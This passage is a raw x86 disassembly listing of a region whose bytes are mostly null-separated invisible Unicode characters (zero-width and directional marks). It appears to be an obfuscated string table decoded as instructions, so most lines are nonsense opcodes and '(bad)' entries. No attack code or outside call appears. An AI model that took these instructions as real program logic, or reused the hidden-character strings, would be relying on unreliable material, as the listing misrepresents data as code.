  407d07:	80 ae 00 e2 80 8e e2 	subb   $0xe2,-0x717f1e00(%esi)
  407d0e:	80 8e e2 80 ac e2 80 	orb    $0x80,-0x1d537f1e(%esi)
  407d15:	8e e2                	mov    %edx,%fs
  407d17:	81 ab e2 81 ae e2 81 	subl   $0x81e2ad81,-0x1d517e1e(%ebx)
  407d1e:	ad e2 81 
  407d21:	af                   	scas   %es:(%edi),%eax
  407d22:	e2 80                	loop   0x407ca4
  407d24:	8f                   	(bad)
  407d25:	e2 81                	loop   0x407ca8
  407d27:	ae                   	scas   %es:(%edi),%al
  407d28:	e2 80                	loop   0x407caa
  407d2a:	ab                   	stos   %eax,%es:(%edi)
  407d2b:	e2 80                	loop   0x407cad
  407d2d:	ad                   	lods   %ds:(%esi),%eax
  407d2e:	e2 80                	loop   0x407cb0
  407d30:	ab                   	stos   %eax,%es:(%edi)
  407d31:	e2 80                	loop   0x407cb3
  407d33:	aa                   	stos   %al,%es:(%edi)
  407d34:	e2 80                	loop   0x407cb6
  407d36:	8e e2                	mov    %edx,%fs
  407d38:	81 ae e2 80 8c e2 80 	subl   $0x80e2ac80,-0x1d737f1e(%esi)
  407d3f:	ac e2 80 
  407d42:	8d                   	lea    (bad),%esp
  407d43:	e2 81                	loop   0x407cc6
  407d45:	ab                   	stos   %eax,%es:(%edi)
  407d46:	e2 81                	loop   0x407cc9
  407d48:	ab                   	stos   %eax,%es:(%edi)
  407d49:	e2 80                	loop   0x407ccb
  407d4b:	8d                   	lea    (bad),%esp
  407d4c:	e2 81                	loop   0x407ccf
  407d4e:	ad                   	lods   %ds:(%esi),%eax
  407d4f:	e2 81                	loop   0x407cd2
  407d51:	ae                   	scas   %es:(%edi),%al
  407d52:	e2 80                	loop   0x407cd4
  407d54:	8f                   	(bad)
  407d55:	e2 80                	loop   0x407cd7
  407d57:	ae                   	scas   %es:(%edi),%al
  407d58:	e2 80                	loop   0x407cda
  407d5a:	8b e2                	mov    %edx,%esp
  407d5c:	80 8b e2 80 8f e2 80 	orb    $0x80,-0x1d707f1e(%ebx)
  407d63:	8f                   	(bad)
  407d64:	e2 80                	loop   0x407ce6
  407d66:	ad                   	lods   %ds:(%esi),%eax
  407d67:	e2 80                	loop   0x407ce9
  407d69:	ae                   	scas   %es:(%edi),%al
  407d6a:	e2 80                	loop   0x407cec
  407d6c:	8b e2                	mov    %edx,%esp
  407d6e:	80 8c e2 81 af e2 80 	orb    $0xad,-0x7f1d507f(%edx,%eiz,8)
  407d75:	ad 
  407d76:	e2 80                	loop   0x407cf8
  407d78:	8b e2                	mov    %edx,%esp
  407d7a:	80 aa e2 81 ae e2 80 	subb   $0x80,-0x1d517e1e(%edx)
  407d81:	8c e2                	mov    %fs,%edx
  407d83:	80 ae 00 e2 81 aa e2 	subb   $0xe2,-0x557e1e00(%esi)
  407d8a:	80 8f e2 81 aa e2 81 	orb    $0x81,-0x1d557e1e(%edi)
  407d91:	aa                   	stos   %al,%es:(%edi)
  407d92:	e2 80                	loop   0x407d14
  407d94:	ac                   	lods   %ds:(%esi),%al
  407d95:	e2 81                	loop   0x407d18
  407d97:	ae                   	scas   %es:(%edi),%al
  407d98:	e2 80                	loop   0x407d1a
  407d9a:	8f                   	(bad)
  407d9b:	e2 81                	loop   0x407d1e
  407d9d:	af                   	scas   %es:(%edi),%eax
  407d9e:	e2 80                	loop   0x407d20
  407da0:	8d                   	lea    (bad),%esp
  407da1:	e2 80                	loop   0x407d23
  407da3:	8b e2                	mov    %edx,%esp
  407da5:	80 8b e2 80 8e e2 81 	orb    $0x81,-0x1d717f1e(%ebx)
  407dac:	ac                   	lods   %ds:(%esi),%al
  407dad:	e2 81                	loop   0x407d30
  407daf:	ac                   	lods   %ds:(%esi),%al
  407db0:	e2 81                	loop   0x407d33
  407db2:	ac                   	lods   %ds:(%esi),%al
  407db3:	e2 80                	loop   0x407d35
  407db5:	8f                   	(bad)
  407db6:	e2 80                	loop   0x407d38
  407db8:	8c e2                	mov    %fs,%edx
  407dba:	80 8f e2 80 8f e2 81 	orb    $0x81,-0x1d707f1e(%edi)
  407dc1:	ac                   	lods   %ds:(%esi),%al
  407dc2:	e2 81                	loop   0x407d45
  407dc4:	ac                   	lods   %ds:(%esi),%al
  407dc5:	e2 80                	loop   0x407d47
  407dc7:	8d                   	lea    (bad),%esp
  407dc8:	e2 80                	loop   0x407d4a
  407dca:	ad                   	lods   %ds:(%esi),%eax
  407dcb:	e2 81                	loop   0x407d4e
  407dcd:	af                   	scas   %es:(%edi),%eax
  407dce:	e2 80                	loop   0x407d50
  407dd0:	ac                   	lods   %ds:(%esi),%al
  407dd1:	e2 80                	loop   0x407d53
  407dd3:	8b e2                	mov    %edx,%esp
  407dd5:	81 aa e2 80 ab e2 81 	subl   $0x80e2ad81,-0x1d547f1e(%edx)
  407ddc:	ad e2 80 
  407ddf:	8d                   	lea    (bad),%esp
  407de0:	e2 80                	loop   0x407d62
  407de2:	ac                   	lods   %ds:(%esi),%al
  407de3:	e2 80                	loop   0x407d65
  407de5:	8d                   	lea    (bad),%esp
  407de6:	e2 80                	loop   0x407d68
  407de8:	8d                   	lea    (bad),%esp
  407de9:	e2 80                	loop   0x407d6b
  407deb:	8b e2                	mov    %edx,%esp
  407ded:	80 8e e2 80 ac e2 81 	orb    $0x81,-0x1d537f1e(%esi)
  407df4:	ae                   	scas   %es:(%edi),%al
  407df5:	e2 80                	loop   0x407d77
  407df7:	ae                   	scas   %es:(%edi),%al
  407df8:	e2 80                	loop   0x407d7a
  407dfa:	8b e2                	mov    %edx,%esp
  407dfc:	80 8d e2 80 ae 00 e2 	orb    $0xe2,0xae80e2(%ebp)
  407e03:	81 ab e2 80 ab e2 80 	subl   $0x80e28e80,-0x1d547f1e(%ebx)
  407e0a:	8e e2 80 
  407e0d:	8c e2                	mov    %fs,%edx
  407e0f:	80 ae e2 81 ab e2 81 	subb   $0x81,-0x1d547e1e(%esi)
  407e16:	ae                   	scas   %es:(%edi),%al
  407e17:	e2 80                	loop   0x407d99
  407e19:	ad                   	lods   %ds:(%esi),%eax
  407e1a:	e2 81                	loop   0x407d9d
  407e1c:	aa                   	stos   %al,%es:(%edi)
  407e1d:	e2 80                	loop   0x407d9f
  407e1f:	8e e2                	mov    %edx,%fs
  407e21:	80 8d e2 80 8e e2 80 	orb    $0x80,-0x1d717f1e(%ebp)
  407e28:	ac                   	lods   %ds:(%esi),%al
  407e29:	e2 80                	loop   0x407dab
  407e2b:	ac                   	lods   %ds:(%esi),%al
  407e2c:	e2 81                	loop   0x407daf
  407e2e:	ac                   	lods   %ds:(%esi),%al
  407e2f:	e2 80                	loop   0x407db1
  407e31:	ad                   	lods   %ds:(%esi),%eax
  407e32:	e2 81                	loop   0x407db5
  407e34:	ae                   	scas   %es:(%edi),%al
  407e35:	e2 80                	loop   0x407db7
  407e37:	8f                   	(bad)
  407e38:	e2 80                	loop   0x407dba
  407e3a:	ae                   	scas   %es:(%edi),%al
  407e3b:	e2 81                	loop   0x407dbe
  407e3d:	ab                   	stos   %eax,%es:(%edi)
  407e3e:	e2 81                	loop   0x407dc1
  407e40:	af                   	scas   %es:(%edi),%eax
  407e41:	e2 80                	loop   0x407dc3
  407e43:	aa                   	stos   %al,%es:(%edi)
  407e44:	e2 80                	loop   0x407dc6
  407e46:	ad                   	lods   %ds:(%esi),%eax
  407e47:	e2 81                	loop   0x407dca
  407e49:	ad                   	lods   %ds:(%esi),%eax
  407e4a:	e2 81                	loop   0x407dcd
  407e4c:	ab                   	stos   %eax,%es:(%edi)
  407e4d:	e2 81                	loop   0x407dd0
  407e4f:	ae                   	scas   %es:(%edi),%al
  407e50:	e2 80                	loop   0x407dd2
  407e52:	8e e2                	mov    %edx,%fs
  407e54:	81 aa e2 81 af e2 80 	subl   $0x81e28e80,-0x1d507e1e(%edx)
  407e5b:	8e e2 81 
  407e5e:	aa                   	stos   %al,%es:(%edi)
  407e5f:	e2 80                	loop   0x407de1
  407e61:	ae                   	scas   %es:(%edi),%al
  407e62:	e2 80                	loop   0x407de4
  407e64:	ad                   	lods   %ds:(%esi),%eax
  407e65:	e2 80                	loop   0x407de7
  407e67:	8f                   	(bad)
  407e68:	e2 80                	loop   0x407dea
  407e6a:	ad                   	lods   %ds:(%esi),%eax
  407e6b:	e2 81                	loop   0x407dee
  407e6d:	ae                   	scas   %es:(%edi),%al
  407e6e:	e2 80                	loop   0x407df0
  407e70:	8b e2                	mov    %edx,%esp
  407e72:	81 aa e2 80 8c e2 80 	subl   $0x80e28d80,-0x1d737f1e(%edx)
  407e79:	8d e2 80 
  407e7c:	ae                   	scas   %es:(%edi),%al
  407e7d:	00 e2                	add    %ah,%dl
  407e7f:	81 ad e2 81 ac e2 80 	subl   $0x81e28f80,-0x1d537e1e(%ebp)
  407e86:	8f e2 81 
  407e89:	aa                   	stos   %al,%es:(%edi)
  407e8a:	e2 81                	loop   0x407e0d
  407e8c:	ad                   	lods   %ds:(%esi),%eax
  407e8d:	e2 80                	loop   0x407e0f
  407e8f:	8d                   	lea    (bad),%esp
  407e90:	e2 80                	loop   0x407e12
  407e92:	aa                   	stos   %al,%es:(%edi)
  407e93:	e2 80                	loop   0x407e15
  407e95:	aa                   	stos   %al,%es:(%edi)
  407e96:	e2 80                	loop   0x407e18
  407e98:	8e e2                	mov    %edx,%fs
  407e9a:	80 8b e2 80 8d e2 80 	orb    $0x80,-0x1d727f1e(%ebx)
  407ea1:	aa                   	stos   %al,%es:(%edi)
  407ea2:	e2 81                	loop   0x407e25
  407ea4:	ae                   	scas   %es:(%edi),%al
  407ea5:	e2 80                	loop   0x407e27
  407ea7:	8c e2                	mov    %fs,%edx
  407ea9:	81 ad e2 81 ad e2 80 	subl   $0x80e2ae80,-0x1d527e1e(%ebp)
  407eb0:	ae e2 80 
  407eb3:	8b e2                	mov    %edx,%esp
  407eb5:	80 8d e2 81 af e2 80 	orb    $0x80,-0x1d507e1e(%ebp)
  407ebc:	8b e2                	mov    %edx,%esp
  407ebe:	80 ac e2 80 ab e2 80 	subb   $0xae,-0x7f1d5480(%edx,%eiz,8)
  407ec5:	ae 
  407ec6:	e2 81                	loop   0x407e49
  407ec8:	ab                   	stos   %eax,%es:(%edi)
  407ec9:	e2 81                	loop   0x407e4c
  407ecb:	ad                   	lods   %ds:(%esi),%eax
  407ecc:	e2 80                	loop   0x407e4e
  407ece:	8b e2                	mov    %edx,%esp
  407ed0:	80 8e e2 80 aa e2 81 	orb    $0x81,-0x1d557f1e(%esi)
  407ed7:	ac                   	lods   %ds:(%esi),%al
  407ed8:	e2 80                	loop   0x407e5a
  407eda:	8f                   	(bad)
  407edb:	e2 80                	loop   0x407e5d
  407edd:	ac                   	lods   %ds:(%esi),%al
  407ede:	e2 81                	loop   0x407e61
  407ee0:	aa                   	stos   %al,%es:(%edi)
  407ee1:	e2 80                	loop   0x407e63
  407ee3:	8d                   	lea    (bad),%esp
  407ee4:	e2 81                	loop   0x407e67
  407ee6:	ad                   	lods   %ds:(%esi),%eax
  407ee7:	e2 80                	loop   0x407e69
  407ee9:	8b e2                	mov    %edx,%esp
  407eeb:	81 af e2 81 ae e2 80 	subl   $0x80e2ab80,-0x1d517e1e(%edi)
  407ef2:	ab e2 80 
  407ef5:	8d                   	lea    (bad),%esp
  407ef6:	e2 80                	loop   0x407e78
  407ef8:	ae                   	scas   %es:(%edi),%al
  407ef9:	00 e2                	add    %ah,%dl
  407efb:	80 ac e2 80 ad e2 81 	subb   $0xaa,-0x7e1d5280(%edx,%eiz,8)
  407f02:	aa 
  407f03:	e2 81                	loop   0x407e86
  407f05:	ae                   	scas   %es:(%edi),%al
  407f06:	e2 81                	loop   0x407e89
  407f08:	ab                   	stos   %eax,%es:(%edi)
  407f09:	e2 81                	loop   0x407e8c
  407f0b:	af                   	scas   %es:(%edi),%eax
  407f0c:	e2 80                	loop   0x407e8e
  407f0e:	ad                   	lods   %ds:(%esi),%eax
  407f0f:	e2 80                	loop   0x407e91
  407f11:	8e e2                	mov    %edx,%fs
  407f13:	81 aa e2 80 ac e2 81 	subl   $0x81e2ac81,-0x1d537f1e(%edx)
  407f1a:	ac e2 81 
  407f1d:	ad                   	lods   %ds:(%esi),%eax
  407f1e:	e2 81                	loop   0x407ea1
  407f20:	ab                   	stos   %eax,%es:(%edi)
  407f21:	e2 81                	loop   0x407ea4
  407f23:	ab                   	stos   %eax,%es:(%edi)
  407f24:	e2 81                	loop   0x407ea7
  407f26:	ac                   	lods   %ds:(%esi),%al
  407f27:	e2 80                	loop   0x407ea9
  407f29:	aa                   	stos   %al,%es:(%edi)
  407f2a:	e2 80                	loop   0x407eac
  407f2c:	ad                   	lods   %ds:(%esi),%eax
  407f2d:	e2 81                	loop   0x407eb0
  407f2f:	ab                   	stos   %eax,%es:(%edi)
  407f30:	e2 81                	loop   0x407eb3
  407f32:	af                   	scas   %es:(%edi),%eax
  407f33:	e2 80                	loop   0x407eb5
  407f35:	ab                   	stos   %eax,%es:(%edi)
  407f36:	e2 81                	loop   0x407eb9
  407f38:	aa                   	stos   %al,%es:(%edi)
  407f39:	e2 81                	loop   0x407ebc
  407f3b:	ad                   	lods   %ds:(%esi),%eax
  407f3c:	e2 81                	loop   0x407ebf
  407f3e:	ad                   	lods   %ds:(%esi),%eax
  407f3f:	e2 80                	loop   0x407ec1
  407f41:	8c e2                	mov    %fs,%edx
  407f43:	80 ab e2 80 ac e2 80 	subb   $0x80,-0x1d537f1e(%ebx)
  407f4a:	ae                   	scas   %es:(%edi),%al
  407f4b:	e2 80                	loop   0x407ecd
  407f4d:	ae                   	scas   %es:(%edi),%al
  407f4e:	e2 81                	loop   0x407ed1
  407f50:	ac                   	lods   %ds:(%esi),%al
  407f51:	e2 81                	loop   0x407ed4
  407f53:	ad                   	lods   %ds:(%esi),%eax
  407f54:	e2 81                	loop   0x407ed7
  407f56:	aa                   	stos   %al,%es:(%edi)
  407f57:	e2 81                	loop   0x407eda
  407f59:	ab                   	stos   %eax,%es:(%edi)
  407f5a:	e2 81                	loop   0x407edd
  407f5c:	ad                   	lods   %ds:(%esi),%eax
  407f5d:	e2 80                	loop   0x407edf
  407f5f:	aa                   	stos   %al,%es:(%edi)
  407f60:	e2 81                	loop   0x407ee3
  407f62:	ae                   	scas   %es:(%edi),%al
  407f63:	e2 80                	loop   0x407ee5
  407f65:	ad                   	lods   %ds:(%esi),%eax
  407f66:	e2 80                	loop   0x407ee8
  407f68:	ac                   	lods   %ds:(%esi),%al
  407f69:	e2 80                	loop   0x407eeb
  407f6b:	aa                   	stos   %al,%es:(%edi)
  407f6c:	e2 80                	loop   0x407eee
  407f6e:	ac                   	lods   %ds:(%esi),%al
  407f6f:	e2 80                	loop   0x407ef1
  407f71:	8d                   	lea    (bad),%esp
  407f72:	e2 80                	loop   0x407ef4
  407f74:	ae                   	scas   %es:(%edi),%al
  407f75:	00 e2                	add    %ah,%dl
  407f77:	80 8e e2 80 ad e2 80 	orb    $0x80,-0x1d527f1e(%esi)
  407f7e:	8b e2                	mov    %edx,%esp
  407f80:	80 8d e2 81 ab e2 80 	orb    $0x80,-0x1d547e1e(%ebp)
  407f87:	8b e2                	mov    %edx,%esp
  407f89:	81 ad e2 81 ad e2 80 	subl   $0x80e2ae80,-0x1d527e1e(%ebp)
  407f90:	ae e2 80 
  407f93:	aa                   	stos   %al,%es:(%edi)
  407f94:	e2 80                	loop   0x407f16
  407f96:	aa                   	stos   %al,%es:(%edi)
  407f97:	e2 80                	loop   0x407f19
  407f99:	8c e2                	mov    %fs,%edx
  407f9b:	81 ae e2 81 aa e2 80 	subl   $0x80e28c80,-0x1d557e1e(%esi)
  407fa2:	8c e2 80 
  407fa5:	8e e2                	mov    %edx,%fs
  407fa7:	80 8d e2 81 ab e2 80 	orb    $0x80,-0x1d547e1e(%ebp)
  407fae:	ab                   	stos   %eax,%es:(%edi)
  407faf:	e2 80                	loop   0x407f31
  407fb1:	8c e2                	mov    %fs,%edx
  407fb3:	81 ae e2 81 ab e2 80 	subl   $0x80e28f80,-0x1d547e1e(%esi)
  407fba:	8f e2 80 
  407fbd:	ae                   	scas   %es:(%edi),%al
  407fbe:	e2 81                	loop   0x407f41
  407fc0:	ad                   	lods   %ds:(%esi),%eax
  407fc1:	e2 81                	loop   0x407f44
  407fc3:	ad                   	lods   %ds:(%esi),%eax
  407fc4:	e2 80                	loop   0x407f46
  407fc6:	8d                   	lea    (bad),%esp
  407fc7:	e2 80                	loop   0x407f49
  407fc9:	aa                   	stos   %al,%es:(%edi)
  407fca:	e2 80                	loop   0x407f4c
  407fcc:	8f                   	(bad)
  407fcd:	e2 81                	loop   0x407f50
  407fcf:	ab                   	stos   %eax,%es:(%edi)
  407fd0:	e2 80                	loop   0x407f52
  407fd2:	8e e2                	mov    %edx,%fs
  407fd4:	81 ad e2 80 aa e2 80 	subl   $0x81e2ae80,-0x1d557f1e(%ebp)
  407fdb:	ae e2 81 
  407fde:	ae                   	scas   %es:(%edi),%al
  407fdf:	e2 81                	loop   0x407f62
  407fe1:	ad                   	lods   %ds:(%esi),%eax
  407fe2:	e2 81                	loop   0x407f65
  407fe4:	ae                   	scas   %es:(%edi),%al
  407fe5:	e2 80                	loop   0x407f67
  407fe7:	ab                   	stos   %eax,%es:(%edi)
  407fe8:	e2 81                	loop   0x407f6b
  407fea:	ac                   	lods   %ds:(%esi),%al
  407feb:	e2 80                	loop   0x407f6d
  407fed:	8d                   	lea    (bad),%esp
  407fee:	e2 80                	loop   0x407f70
  407ff0:	ae                   	scas   %es:(%edi),%al
  407ff1:	00 e2                	add    %ah,%dl
  407ff3:	80 8c e2 81 ae e2 80 	orb    $0xae,-0x7f1d517f(%edx,%eiz,8)
  407ffa:	ae 
  407ffb:	e2 80                	loop   0x407f7d
  407ffd:	8e e2                	mov    %edx,%fs
  407fff:	80 aa e2 81 aa e2 81 	subb   $0x81,-0x1d557e1e(%edx)
  408006:	aa                   	stos   %al,%es:(%edi)
  408007:	e2 80                	loop   0x407f89
  408009:	8e e2                	mov    %edx,%fs
  40800b:	80 8d e2 81 ab e2 81 	orb    $0x81,-0x1d547e1e(%ebp)
  408012:	ad                   	lods   %ds:(%esi),%eax
  408013:	e2 80                	loop   0x407f95
  408015:	8c e2                	mov    %fs,%edx
  408017:	81 ab e2 81 ae e2 80 	subl   $0x80e2ae80,-0x1d517e1e(%ebx)
  40801e:	ae e2 80 
  408021:	8d                   	lea    (bad),%esp
  408022:	e2 81                	loop   0x407fa5
  408024:	ad                   	lods   %ds:(%esi),%eax
  408025:	e2 81                	loop   0x407fa8
  408027:	ad                   	lods   %ds:(%esi),%eax
  408028:	e2 81                	loop   0x407fab
  40802a:	ad                   	lods   %ds:(%esi),%eax
  40802b:	e2 80                	loop   0x407fad
  40802d:	ae                   	scas   %es:(%edi),%al
  40802e:	e2 81                	loop   0x407fb1
  408030:	ac                   	lods   %ds:(%esi),%al
  408031:	e2 80                	loop   0x407fb3
  408033:	8e e2                	mov    %edx,%fs
  408035:	80 ae e2 80 8c e2 80 	subb   $0x80,-0x1d737f1e(%esi)
  40803c:	ae                   	scas   %es:(%edi),%al
  40803d:	e2 80                	loop   0x407fbf
  40803f:	8d                   	lea    (bad),%esp
  408040:	e2 81                	loop   0x407fc3
  408042:	ab                   	stos   %eax,%es:(%edi)
  408043:	e2 80                	loop   0x407fc5
  408045:	aa                   	stos   %al,%es:(%edi)
  408046:	e2 81                	loop   0x407fc9
  408048:	af                   	scas   %es:(%edi),%eax
  408049:	e2 80                	loop   0x407fcb
  40804b:	ad                   	lods   %ds:(%esi),%eax
  40804c:	e2 80                	loop   0x407fce
  40804e:	8f                   	(bad)
  40804f:	e2 81                	loop   0x407fd2
  408051:	aa                   	stos   %al,%es:(%edi)
  408052:	e2 81                	loop   0x407fd5
  408054:	aa                   	stos   %al,%es:(%edi)
  408055:	e2 80                	loop   0x407fd7
  408057:	ae                   	scas   %es:(%edi),%al
  408058:	e2 81                	loop   0x407fdb
  40805a:	ae                   	scas   %es:(%edi),%al
  40805b:	e2 80                	loop   0x407fdd
  40805d:	8c e2                	mov    %fs,%edx
  40805f:	81 ae e2 81 ab e2 81 	subl   $0x80e2ac81,-0x1d547e1e(%esi)
  408066:	ac e2 80 
  408069:	8d                   	lea    (bad),%esp
  40806a:	e2 80                	loop   0x407fec
  40806c:	ae                   	scas   %es:(%edi),%al
  40806d:	00 e2                	add    %ah,%dl
  40806f:	80 8c e2 80 8b e2 80 	orb    $0xac,-0x7f1d7480(%edx,%eiz,8)
  408076:	ac 
  408077:	e2 80                	loop   0x407ff9
  408079:	ab                   	stos   %eax,%es:(%edi)
  40807a:	e2 81                	loop   0x407ffd
  40807c:	ac                   	lods   %ds:(%esi),%al
  40807d:	e2 80                	loop   0x407fff
  40807f:	8e e2                	mov    %edx,%fs
  408081:	81 ad e2 81 af e2 81 	subl   $0x81e2ae81,-0x1d507e1e(%ebp)
  408088:	ae e2 81 
  40808b:	af                   	scas   %es:(%edi),%eax
  40808c:	e2 80                	loop   0x40800e
  40808e:	8f                   	(bad)
  40808f:	e2 81                	loop   0x408012
  408091:	ae                   	scas   %es:(%edi),%al
  408092:	e2 81                	loop   0x408015
  408094:	ab                   	stos   %eax,%es:(%edi)
  408095:	e2 81                	loop   0x408018
  408097:	ad                   	lods   %ds:(%esi),%eax
  408098:	e2 80                	loop   0x40801a
  40809a:	ac                   	lods   %ds:(%esi),%al
  40809b:	e2 80                	loop   0x40801d
  40809d:	8d                   	lea    (bad),%esp
  40809e:	e2 80                	loop   0x408020
  4080a0:	ae                   	scas   %es:(%edi),%al
  4080a1:	e2 80                	loop   0x408023
  4080a3:	8b e2                	mov    %edx,%esp
  4080a5:	80 8f e2 81 ae e2 81 	orb    $0x81,-0x1d517e1e(%edi)
  4080ac:	af                   	scas   %es:(%edi),%eax
  4080ad:	e2 81                	loop   0x408030
  4080af:	ad                   	lods   %ds:(%esi),%eax
  4080b0:	e2 80                	loop   0x408032
  4080b2:	ac                   	lods   %ds:(%esi),%al
  4080b3:	e2 81                	loop   0x408036
  4080b5:	ab                   	stos   %eax,%es:(%edi)
  4080b6:	e2 81                	loop   0x408039
  4080b8:	ad                   	lods   %ds:(%esi),%eax
  4080b9:	e2 80                	loop   0x40803b
  4080bb:	8c e2                	mov    %fs,%edx
  4080bd:	81 ad e2 80 ac e2 81 	subl   $0x80e2aa81,-0x1d537f1e(%ebp)
  4080c4:	aa e2 80 
  4080c7:	ad                   	lods   %ds:(%esi),%eax
  4080c8:	e2 81                	loop   0x40804b
  4080ca:	ae                   	scas   %es:(%edi),%al
  4080cb:	e2 80                	loop   0x40804d
  4080cd:	ab                   	stos   %eax,%es:(%edi)
  4080ce:	e2 81                	loop   0x408051
  4080d0:	ac                   	lods   %ds:(%esi),%al
  4080d1:	e2 81                	loop   0x408054
  4080d3:	ae                   	scas   %es:(%edi),%al
  4080d4:	e2 80                	loop   0x408056
  4080d6:	8b e2                	mov    %edx,%esp
  4080d8:	81 af e2 80 8c e2 80 	subl   $0x80e2ad80,-0x1d737f1e(%edi)
  4080df:	ad e2 80 
  4080e2:	ad                   	lods   %ds:(%esi),%eax
  4080e3:	e2 80                	loop   0x408065
  4080e5:	8d                   	lea    (bad),%esp
  4080e6:	e2 80                	loop   0x408068
  4080e8:	ae                   	scas   %es:(%edi),%al
  4080e9:	00 e2                	add    %ah,%dl
  4080eb:	81 ae e2 81 aa e2 80 	subl   $0x80e2aa80,-0x1d557e1e(%esi)
  4080f2:	aa e2 80 
  4080f5:	8b e2                	mov    %edx,%esp
  4080f7:	80 8c e2 81 ac e2 80 	orb    $0x8d,-0x7f1d537f(%edx,%eiz,8)
  4080fe:	8d 
  4080ff:	e2 80                	loop   0x408081
  408101:	8e e2                	mov    %edx,%fs
  408103:	81 ac e2 80 ac e2 81 	subl   $0xaa81e2ac,-0x7e1d5380(%edx,%eiz,8)
  40810a:	ac e2 81 aa 
  40810e:	e2 80                	loop   0x408090
  408110:	ad                   	lods   %ds:(%esi),%eax
  408111:	e2 81                	loop   0x408094
  408113:	ab                   	stos   %eax,%es:(%edi)
  408114:	e2 80                	loop   0x408096
  408116:	8c e2                	mov    %fs,%edx
  408118:	80 8f e2 81 ae e2 81 	orb    $0x81,-0x1d517e1e(%edi)
  40811f:	ab                   	stos   %eax,%es:(%edi)
  408120:	e2 81                	loop   0x4080a3
  408122:	af                   	scas   %es:(%edi),%eax
  408123:	e2 81                	loop   0x4080a6
  408125:	ae                   	scas   %es:(%edi),%al
  408126:	e2 81                	loop   0x4080a9
  408128:	ae                   	scas   %es:(%edi),%al
  408129:	e2 80                	loop   0x4080ab
  40812b:	ad                   	lods   %ds:(%esi),%eax
  40812c:	e2 80                	loop   0x4080ae
  40812e:	ab                   	stos   %eax,%es:(%edi)
  40812f:	e2 80                	loop   0x4080b1
  408131:	8e e2                	mov    %edx,%fs
  408133:	80 8d e2 80 8b e2 80 	orb    $0x80,-0x1d747f1e(%ebp)
  40813a:	ae                   	scas   %es:(%edi),%al
  40813b:	e2 81                	loop   0x4080be
  40813d:	ad                   	lods   %ds:(%esi),%eax
  40813e:	e2 80                	loop   0x4080c0
  408140:	ae                   	scas   %es:(%edi),%al
  408141:	e2 80                	loop   0x4080c3
  408143:	ab                   	stos   %eax,%es:(%edi)
  408144:	e2 80                	loop   0x4080c6
  408146:	aa                   	stos   %al,%es:(%edi)
  408147:	e2 80                	loop   0x4080c9
  408149:	ad                   	lods   %ds:(%esi),%eax
  40814a:	e2 80                	loop   0x4080cc
  40814c:	ad                   	lods   %ds:(%esi),%eax
  40814d:	e2 80                	loop   0x4080cf
  40814f:	8d                   	lea    (bad),%esp
  408150:	e2 80                	loop   0x4080d2
  408152:	8f                   	(bad)
  408153:	e2 80                	loop   0x4080d5
  408155:	ab                   	stos   %eax,%es:(%edi)
  408156:	e2 80                	loop   0x4080d8
  408158:	8c e2                	mov    %fs,%edx
  40815a:	80 8e e2 80 8e e2 80 	orb    $0x80,-0x1d717f1e(%esi)
  408161:	8e e2                	mov    %edx,%fs
  408163:	80 ae 00 e2 81 af e2 	subb   $0xe2,-0x507e1e00(%esi)
  40816a:	80 8f e2 80 ab e2 80 	orb    $0x80,-0x1d547f1e(%edi)
  408171:	8e e2                	mov    %edx,%fs
  408173:	80 8f e2 80 ae e2 81 	orb    $0x81,-0x1d517f1e(%edi)
  40817a:	ac                   	lods   %ds:(%esi),%al
  40817b:	e2 80                	loop   0x4080fd
  40817d:	ab                   	stos   %eax,%es:(%edi)
  40817e:	e2 81                	loop   0x408101
  408180:	ad                   	lods   %ds:(%esi),%eax
  408181:	e2 80                	loop   0x408103
  408183:	ab                   	stos   %eax,%es:(%edi)
  408184:	e2 81                	loop   0x408107
  408186:	ac                   	lods   %ds:(%esi),%al
  408187:	e2 80                	loop   0x408109
  408189:	aa                   	stos   %al,%es:(%edi)
  40818a:	e2 81                	loop   0x40810d
  40818c:	aa                   	stos   %al,%es:(%edi)
  40818d:	e2 81                	loop   0x408110
  40818f:	ac                   	lods   %ds:(%esi),%al
  408190:	e2 81                	loop   0x408113
  408192:	ac                   	lods   %ds:(%esi),%al
  408193:	e2 80                	loop   0x408115
  408195:	ad                   	lods   %ds:(%esi),%eax
  408196:	e2 81                	loop   0x408119
  408198:	ab                   	stos   %eax,%es:(%edi)
  408199:	e2 80                	loop   0x40811b
  40819b:	8e e2                	mov    %edx,%fs
  40819d:	81 ad e2 80 8e e2 80 	subl   $0x80e28d80,-0x1d717f1e(%ebp)
  4081a4:	8d e2 80 
  4081a7:	ab                   	stos   %eax,%es:(%edi)
  4081a8:	e2 80                	loop   0x40812a
  4081aa:	8e e2                	mov    %edx,%fs
  4081ac:	80 aa e2 80 ac e2 80 	subb   $0x80,-0x1d537f1e(%edx)
  4081b3:	8d                   	lea    (bad),%esp
  4081b4:	e2 80                	loop   0x408136
  4081b6:	ac                   	lods   %ds:(%esi),%al
  4081b7:	e2 80                	loop   0x408139
  4081b9:	8c e2                	mov    %fs,%edx
  4081bb:	80 8f e2 80 8b e2 80 	orb    $0x80,-0x1d747f1e(%edi)
  4081c2:	ae                   	scas   %es:(%edi),%al
  4081c3:	e2 80                	loop   0x408145
  4081c5:	8d                   	lea    (bad),%esp
  4081c6:	e2 81                	loop   0x408149
  4081c8:	ac                   	lods   %ds:(%esi),%al
  4081c9:	e2 81                	loop   0x40814c
  4081cb:	af                   	scas   %es:(%edi),%eax
  4081cc:	e2 81                	loop   0x40814f
  4081ce:	ae                   	scas   %es:(%edi),%al
  4081cf:	e2 80                	loop   0x408151
  4081d1:	ac                   	lods   %ds:(%esi),%al
  4081d2:	e2 80                	loop   0x408154
  4081d4:	8b e2                	mov    %edx,%esp
  4081d6:	80 8f e2 80 8f e2 80 	orb    $0x80,-0x1d707f1e(%edi)
  4081dd:	8e e2                	mov    %edx,%fs
  4081df:	80 ae 00 e2 80 ac e2 	subb   $0xe2,-0x537f1e00(%esi)
  4081e6:	81 ae e2 81 ac e2 80 	subl   $0x80e2ab80,-0x1d537e1e(%esi)
  4081ed:	ab e2 80 
  4081f0:	8c e2                	mov    %fs,%edx
  4081f2:	81 ab e2 81 ac e2 80 	subl   $0x81e28e80,-0x1d537e1e(%ebx)
  4081f9:	8e e2 81 
  4081fc:	aa                   	stos   %al,%es:(%edi)
  4081fd:	e2 81                	loop   0x408180
  4081ff:	aa                   	stos   %al,%es:(%edi)
  408200:	e2 80                	loop   0x408182
  408202:	8f                   	(bad)
  408203:	e2 80                	loop   0x408185
  408205:	8e e2                	mov    %edx,%fs
  408207:	81 ab e2 80 8f e2 81 	subl   $0x80e2ad81,-0x1d707f1e(%ebx)
  40820e:	ad e2 80 
  408211:	ac                   	lods   %ds:(%esi),%al
